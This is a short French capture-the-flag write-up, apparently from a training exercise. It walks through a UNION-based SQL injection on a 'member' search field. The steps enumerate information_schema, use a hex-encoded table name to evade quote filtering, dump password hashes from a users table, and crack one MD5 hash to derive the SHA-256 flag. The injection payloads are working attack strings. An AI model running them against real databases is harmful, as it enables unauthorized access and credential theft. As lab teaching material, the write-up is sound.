
On display les informations concernant la base de donnée SQL grace a information_schema.tables

Dans la barre de recherche de la page 'member':
1 union select table_schema,table_name from information_schema.tables

On voit qu'il existe une table users, il faut maintenant récupérer la value des columns pour trouver un couple identifiant/mot de passe, l'input de member n'accepte que les requetes qui ne demandent que 2 valeurs. Pour contrer la sécurité sur les quotes qui nous empêche de demander directement la table users on convertit le nom de la table en hexa.

1 union select null,group_concat(column_name) from information_schema.columns where table_name = 0x7573657273 # (0x7573657273 == users en hexa seul moyen pour que table_name accept l'input)

Il nous reste plus qu'a choisir les columns que l'on souhaite

1 union select Commentaire,countersign from users


result :: 

ID: 1 union select Commentaire,countersign from users
First name: Amerca !
Surname : 2b3366bcfd44f540e630d4dc2b9b06d9
ID: 1 union select Commentaire,countersign from users
First name: Ich spreche kein Deutsch.
Surname : 60e9032c586fb422e2c16dee6286cf10
ID: 1 union select Commentaire,countersign from users
First name: ????? ????????????? ?????????
Surname : e083b24a01c483437bcf4a9eea7c1b4d
ID: 1 union select Commentaire,countersign from users
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28

md5 hash : 5ff9d0165b4f92b14994e5c685cdce28 =  FortyTwo
lower all char  = fortytwo
hash Sh256 = 4A474D7856BE3C7FCB262B8E2E931E20FC8EC61FEBD184F40D5D0452C291ED22
